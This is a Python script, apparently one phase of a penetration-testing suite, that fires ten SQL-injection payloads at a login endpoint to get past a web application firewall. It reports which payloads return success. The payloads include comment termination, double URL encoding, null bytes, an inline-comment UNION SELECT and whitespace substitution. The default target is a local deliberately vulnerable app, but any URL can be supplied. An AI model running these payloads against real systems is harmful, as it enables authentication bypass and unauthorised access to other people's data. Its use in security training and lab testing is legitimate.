#!/usr/bin/env python3
"""Phase 9: WAF Bypass & Encoding Techniques"""

import requests
import argparse
import urllib.parse


class Phase9WAFBypass:
    def __init__(self, target="http://localhost:5001"):
        self.target = target

    def test_bypass(self, name, payload):
        try:
            data = {"username": payload, "password": "test"}
            response = requests.post(
                f"{self.target}/api/vulnerable/login", json=data, timeout=5)

            if response.status_code == 200:
                print(f"  ✅ {name} - Bypass successful")
                return True
            else:
                print(f"  ❌ {name} - Status: {response.status_code}")
                return False
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return False

    def run(self):
        print("\n" + "="*70)
        print("PHASE 9: WAF BYPASS TECHNIQUES")
        print("="*70)
        print(f"Target: {self.target}\n")

        tests = [
            ("Basic Bypass", "admin' --"),
            ("Double URL Encode", "admin%2527%2520--"),
            ("Case Variation", "AdMiN' --"),
            ("Comment in Middle", "admin'/**/--"),
            ("Null Byte Injection", "admin'%00 --"),
            ("Hex Encoding", "0x61646d696e27202d2d"),  # hex of "admin' --"
            ("Union with Intruder", "' UNION/*!50000SELECT*/1,2,3,4,5,6,7,8,9--"),
            ("Space Replacement", "'%0aOR%0a'1'%3d'1'%0a--"),
            ("Tab Injection", "admin'\t\t--"),
            ("Newline Injection", "admin'\n--"),
        ]

        for name, payload in tests:
            self.test_bypass(name, payload)
            print()

        print("="*70)
        print("✅ Phase 9 Complete")
        print("="*70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase9WAFBypass(target=args.target)
    phase.run()
